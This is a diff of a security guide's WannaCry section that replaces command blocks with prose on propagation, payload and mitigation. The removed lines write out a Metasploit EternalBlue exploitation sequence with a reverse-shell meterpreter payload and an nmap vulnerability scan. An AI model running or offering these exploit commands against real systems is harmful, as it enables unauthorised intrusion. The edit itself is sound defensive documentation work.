@@ -1134,35 +1134,16 @@ WannaCry Kill Chain:
 
 ### Technical Analysis
 
-```bash
-# EternalBlue exploitation
-# SMB vulnerability in Windows
-
-# Check if system is vulnerable
-nmap -p 445 --script smb-vuln-ms17-010 <target>
-
-# Metasploit exploitation
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS <target>
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-exploit
-```
+- **Worm propagation:** WannaCry used SMBv1 remote-code-execution flaws, including the vulnerability addressed by [Microsoft security bulletin MS17-010](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010), to reach vulnerable Windows systems over SMB. Network reachability and patch state shaped propagation.
+- **Ransomware payload:** The malware encrypted files on infected systems and displayed a ransom demand. This payload is distinct from the worm's network-spread behavior.
+- **Evidence limit:** These behaviors describe the campaign, not the initial entry point of every affected organization or every variant.
 
 ### Prevention & Mitigation
-```bash
-# Apply MS17-010 patch
-wusa.exe Windows-KB4012212-x64.msu /quiet /norestart
 
-# Disable SMBv1
-Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol
-
-# Block SMB ports at firewall
-# TCP 445, 139
-# UDP 137, 138
-
-# Enable Windows Firewall
-netsh advfirewall set allprofiles state on
-```
+- Apply the security update appropriate to each supported Windows version and verify status using Microsoft's [MS17-010 guidance](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010). Unsupported systems require an approved replacement or isolation plan.
+- Disable SMBv1 where it is not required, after checking dependencies and planning the required system restart.
+- Restrict SMB traffic between network zones and from untrusted networks. Keep required file-sharing paths available; do not apply blanket port blocks without an impact review.
+- Maintain tested, isolated backups and an incident-response process for suspected encryption or worm propagation.
 
 [Return to Table of Contents](#table-of-contents---enhanced-edition)
 
